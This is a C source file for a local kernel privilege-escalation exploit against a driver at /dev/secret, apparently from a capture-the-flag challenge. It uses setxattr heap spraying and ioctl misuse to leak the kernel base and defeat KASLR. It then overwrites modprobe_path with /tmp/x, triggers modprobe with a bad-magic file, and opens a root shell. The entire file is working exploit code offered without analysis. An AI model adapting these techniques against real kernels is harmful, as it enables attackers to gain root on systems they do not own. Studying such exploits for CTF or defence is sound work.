#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

static char COMMAND[] =
  "#!/bin/sh" "\n"
  "mkdir -p /mnt" "\n"
  "mount /dev/vda /mnt" "\n";

#define CMD_ADD 0x01C029
#define CMD_GET 0x01C07b
#define CMD_SET 0x01C082
#define CMD_DEL 0x01C087

typedef unsigned long u64;
struct request_t {
  u64 value;
  u64 key;
};

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  int fd;
  u64 fake_node[0x30 / sizeof(u64)];
  struct request_t req = {};
  struct request_t *ro_mem = (struct request_t*)
    mmap(NULL, 0x1000, PROT_READ, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
  if (ro_mem == MAP_FAILED)
    fatal("mmap");

  /* KASRL leak */
  // Prepare uninitialized link pointer
  fake_node[5] = 0xfffffe0000000008; // cpu_entry_area
  setxattr("/tmp", "A", fake_node, 0x30, 0);
  // Allocate root node
  fd = open("/dev/secret", O_RDWR);
  if (fd == -1) fatal("/dev/secret");
  // Confuse counter
  ioctl(fd, CMD_ADD, ro_mem);
  // Leak kernel address
  req.key = 0x00000000ffffffff;
  ioctl(fd, CMD_GET, &req);
  u64 leak = 0xffffffff00000000 | (req.value >> 32);
  u64 kbase = leak - 0x808e03;
  printf("[+] kbase = 0x%016lx\n", kbase);
  u64 addr_modprobe_path = kbase + 0xe387c0;

  /* Overwrite modprobe_path */
  unsigned char evil[] = "/tmp/x";
  u64 initial_key = 0x000065626f727064; // "dprobe\0\0"

  for (int i = 0; i < sizeof(evil); i++) {
    // Prepare uninitialized link pointer
    fake_node[5] = addr_modprobe_path - 8 + i;
    setxattr("/tmp", "A", fake_node, 0x30, 0);
    // Allocate root node
    fd = open("/dev/secret", O_RDWR);
    if (fd == -1) fatal("/dev/secret");
    // Confuse counter
    ioctl(fd, CMD_ADD, ro_mem);

    // Put a random byte until we get a good key
    req.key = initial_key;
    while (1) {
      req.value = 0;
      ioctl(fd, CMD_SET, &req);
      if ((req.value & 0xff) == evil[i])
        break;
    }
    initial_key = req.key >> 8;
  }

  /* Call modprobe_path */
  FILE *fp = fopen("/tmp/x", "w");
  fwrite(COMMAND, 1, sizeof(COMMAND), fp);
  fclose(fp);
  system("chmod +x /tmp/x");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
  system("chmod +x /tmp/y");
  system("/tmp/y");

  /* Win! */
  system("/bin/sh");
  return 0;
}

